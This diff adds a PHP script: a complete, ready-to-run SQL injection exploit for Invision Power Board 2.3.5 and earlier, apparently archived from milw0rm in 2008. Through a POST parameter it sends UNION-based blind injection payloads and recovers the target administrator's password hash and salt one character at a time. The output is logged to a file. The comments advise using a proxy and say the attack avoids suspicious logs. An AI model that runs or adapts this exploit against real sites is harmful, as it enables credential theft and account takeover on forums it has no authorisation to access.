@@ -1,0 +1,400 @@
+<?php
+error_reporting(E_ALL);
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+// IPB <= 2.3.5 sql injection exploit
+// Version 1.0
+// written by Janek Vind "waraxe"
+// Estonia, Tartu
+// http://www.waraxe.us/
+// 20. september 2008
+// based on DarkFig's advisory
+// http://acid-root.new.fr/?0:18
+//
+// FEATURES:
+// 1. Fetching algorithm optimized for speed
+// 2. Attack goes through $_POST, so no suspicious logs
+// 3. Pretesting saves time if IPB is not vulnerable
+//
+// More useful tools: http://www.waraxe.us/tools/
+// Waraxe forums: http://www.waraxe.us/forums.html 
+//
+// NB! This exploit is meant to be run as php CLI!
+// http://www.php.net/features.commandline
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+//=====================================================================
+$url = 'http://localhost/ipb.2.3.5/';
+$id = 1;// ID of the target user, default value "1" is admin's ID
+$prefix = 'ibf_';// IPB table prefix, default is "ibf_"
+# Proxy settings
+# Be sure to use proxy :)
+//$proxy_ip_port = '127.0.0.1:8118';
+//$proxy_user_password = 'someuser:somepassword';
+$outfile = './ipblog.txt';// Log file
+//======================================================================
+///////////////////////////////////////////////////////////////////////
+// Don't mess below this line, unless you know the stuff ;)
+///////////////////////////////////////////////////////////////////////
+//=====================================================================
+///////////////////////////////////////////////////////////////////////
+$cli = php_sapi_name() === 'cli';
+//=====================================================================
+// Warning, if executed from webserver
+//=====================================================================
+if(!$cli)
+{
+	if(!isset($_REQUEST['wtf-is-cli']))
+	{ 
+		echo "<html><head><title>Attention!</title></head>\n";
+		echo "<body><br /><br /><center>\n";
+		echo "<h1>Warning!</h1>\n";
+		echo "This exploit is meant to be used as php CLI script!<br />\n";
+		echo "More information:<br />\n";
+		echo "<a href=\"http://www.google.com/search?hl=en&q=php+cli+windows\" target=\"_blank\">http://www.google.com/search?hl=en&q=php+cli+windows</a><br />\n";
+		echo "Still, you can try to run it from webserver.<br />\n";
+		echo "Just press the button below and prepare for long waiting<br />\n";
+		echo "And learn to use php CLI next time, please ...<br />\n";
+		echo "<form method=\"get\">\n";
+		echo "<input type=\"submit\" name=\"wtf-is-cli\" value=\"Let me in, i don't care\">\n";
+		echo "</form>\n";
+		echo "</center></body></html>\n";
+		exit;
+	}
+	else
+	{
+		// Let's try to maximize our chances without CLI
+		@set_time_limit(0);
+	}
+}
+//=====================================================================
+xecho("Target: $url\n");
+xecho("Sql table prefix: $prefix\n");
+xecho("Testing target URL ... \n");
+test_target_url();
+xecho("Target URL seems to be valid\n");
+xecho("Testing target ID ... \n");
+test_target_id();
+xecho("Target ID seems to be valid\n");
+
+$hash = get_hash();
+$salt = get_salt();
+
+add_line("Target: $url");
+add_line("User ID: $id");
+add_line("Hash: $hash");
+add_line("Salt: $salt");
+add_line("------------------------------------------");
+
+xecho("\n------------------------------------------\n");
+xecho("Hash: $hash\n");
+xecho("Salt: $salt");
+xecho("\n------------------------------------------\n");
+
+xecho("\nQuestions and feedback - http://www.waraxe.us/ \n");
+die("See ya! :) \n");
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+function test_target_url()
+{
+	global $url;
+	
+	$post = 'act=xmlout&do=check-display-name&name=somethingfoobarkind%2527 OR 1=1-- ';
+	$buff = trim(make_post($url, $post, '', $url));
+	if($buff !== 'found')
+	{
+		die('Invalid response, target URL not valid? Exiting ...');
+	}
+}
+//////////////////////////////////////////////////////////////////////
+function test_target_id()
+{
+	global $url, $prefix, $id;
+	
+	$post = 'UNION SELECT 1,1 FROM ' . $prefix . 'members_converge WHERE converge_id=' . $id . ' AND LENGTH(converge_pass_hash)=32';
+	if(!test_condition($post))
+	{
+		die('Invalid response, target ID not valid? Exiting ...');
+	}
+}
+///////////////////////////////////////////////////////////////////////
+function get_salt()
+{
+	$len = 5;
+	$out = '';
+	
+	xecho("Finding salt ...\n");
+	
+	for($i = 1; $i < $len + 1; $i ++)
+	{
+		$ch = get_saltchar($i);
+		xecho("Got pos $i --> $ch\n");
+		$out .= "$ch";
+		xecho("Current salt: $out \n");
+	}
+	
+	xecho("\nFinal salt: $out\n\n");
+	
+	return $out;
+}
+///////////////////////////////////////////////////////////////////////
+function get_saltchar($pos)
+{
+	global $prefix, $id;
+
+	$char = '';
+	$min = 32;
+	$max = 128;
+	$pattern = 'UNION SELECT 1,1 FROM ' . $prefix . "members_converge WHERE converge_id=$id AND ORD(SUBSTR(converge_pass_salt,$pos,1))";
+	$curr = 0;
+	
+	while(1)
+	{
+		$area = $max - $min;
+		if($area < 2 )
+		{
+			$post = $pattern . "=$max";
+			$eq = test_condition($post);
+			
+			if($eq)
+			{
+				$char = chr($max);
+			}
+			else
+			{
+				$char = chr($min);
+			}
+			
+			break;
+		}
+		
+		$half = intval(floor($area / 2));
+		$curr = $min + $half;
+		
+		$post = $pattern . '%253e' . $curr;
+		
+		$bigger = test_condition($post);
+		
+		if($bigger)
+		{
+			$min = $curr;
+		}
+		else
+		{
+			$max = $curr;
+		}
+
+		xecho("Current test: $curr-$max-$min\n");
+	}
+	
+	return $char;
+}
+///////////////////////////////////////////////////////////////////////
+function get_hash()
+{
+	$len = 32;
+	$out = '';
+	
+	xecho("Finding hash ...\n");
+	
+	for($i = 1; $i < $len + 1; $i ++)
+	{
+		$ch = get_hashchar($i);
+		xecho("Got pos $i --> $ch\n");
+		$out .= "$ch";
+		xecho("Current hash: $out \n");
+	}
+	
+	xecho("\nFinal hash: $out\n\n");
+	
+	return $out;
+}
+///////////////////////////////////////////////////////////////////////
+function get_hashchar($pos)
+{
+	global $prefix, $id;
+
+	$char = '';
+	$pattern = 'UNION SELECT 1,1 FROM ' . $prefix . "members_converge WHERE converge_id=$id AND ORD(SUBSTR(converge_pass_hash,$pos,1))";
+
+	// First let's determine, if it's number or letter
+	$post = $pattern . '%253e57';
+	$letter = test_condition($post);
+	
+	if($letter)
+	{
+		$min = 97;
+		$max = 102;
+		xecho("Char to find is [a-f]\n");
+	}
+	else
+	{
+		$min = 48;
+		$max = 57;
+		xecho("Char to find is [0-9]\n");
+	}
+
+	$curr = 0;
+	
+	while(1)
+	{
+		$area = $max - $min;
+		if($area < 2 )
+		{
+			$post = $pattern . "=$max";
+			$eq = test_condition($post);
+			
+			if($eq)
+			{
+				$char = chr($max);
+			}
+			else
+			{
+				$char = chr($min);
+			}
+			
+			break;
+		}
+		
+		$half = intval(floor($area / 2));
+		$curr = $min + $half;
+		
+		$post = $pattern . '%253e' . $curr;
+		
+		$bigger = test_condition($post);
+		
+		if($bigger)
+		{
+			$min = $curr;
+		}
+		else
+		{
+			$max = $curr;
+		}
+
+		xecho("Current test: $curr-$max-$min\n");
+	}
+	
+	return $char;
+}
+///////////////////////////////////////////////////////////////////////
+function test_condition($p)
+{
+	global $url;
+	
+	$bret = false;
+	$maxtry = 10;
+	$try = 1;
+		
+	$pattern = 'act=xmlout&do=check-display-name&name=%%2527 OR 1=%%2522%%2527%%2522 %s OR 1=%%2522%%2527%%2522-- ';
+	$post = sprintf($pattern, $p);
+	
+	while(1)
+	{
+		$buff = trim(make_post($url, $post, '', $url));
+
+		if($buff === 'found')
+		{
+			$bret = true;
+			break;
+		}
+		elseif($buff === 'notfound')
+		{
+			break;
+		}
+		elseif(strpos($buff, '<title>IPS Driver Error</title>') !== false)
+		{
+			die("Sql error! Wrong prefix?\nExiting ... ");
+		}
+		else
+		{
+			xecho("test_condition() - try $try - invalid return value ...\n");
+			$try ++;
+			if($try > $maxtry)
+			{
+				die("Too many tries - exiting ...\n");
+			}
+			else
+			{
+				xecho("Trying again - try $try ...\n");
+			}
+		}
+	}
+	
+	return $bret;
+}
+///////////////////////////////////////////////////////////////////////
+function make_post($url, $post_fields='', $cookie = '', $referer = '', $headers = FALSE)
+{
+	$ch = curl_init();
+	$timeout = 120;
+	curl_setopt ($ch, CURLOPT_URL, $url);
+	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+	curl_setopt($ch, CURLOPT_POST, 1); 
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+	curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)');
+	
+	if(!empty($GLOBALS['proxy_ip_port']))
+	{
+		curl_setopt($ch, CURLOPT_PROXY, $GLOBALS['proxy_ip_port']);
+		
+		if(!empty($GLOBALS['proxy_user_password']))
+		{
+			curl_setopt($ch, CURLOPT_PROXYUSERPWD, $GLOBALS['proxy_user_password']); 
+		}
+	}
+	
+	if(!empty($cookie))
+	{
+		curl_setopt ($ch, CURLOPT_COOKIE, $cookie);
+	}
+ 
+	if(!empty($referer))
+	{
+		curl_setopt ($ch, CURLOPT_REFERER, $referer);
+	}
+
+	if($headers === TRUE)
+	{
+		curl_setopt ($ch, CURLOPT_HEADER, TRUE);
+	}
+	else
+	{
+		curl_setopt ($ch, CURLOPT_HEADER, FALSE);
+	}
+
+	$fc = curl_exec($ch);
+	curl_close($ch);
+	
+	return $fc;
+}
+///////////////////////////////////////////////////////////////////////
+function add_line($line)
+{
+	global $outfile;
+	
+	$line .= "\n";
+	$fh = fopen($outfile, 'ab');
+	fwrite($fh, $line);
+	fclose($fh);
+	
+}
+///////////////////////////////////////////////////////////////////////
+function xecho($line)
+{
+	if($GLOBALS['cli'])
+	{
+		echo "$line";
+	}
+	else
+	{
+		$line = nl2br(htmlspecialchars($line));
+		echo "$line";
+	}
+}
+//////////////////////////////////////////////////////////////////////
+?>
+
+# milw0rm.com [2008-09-21]
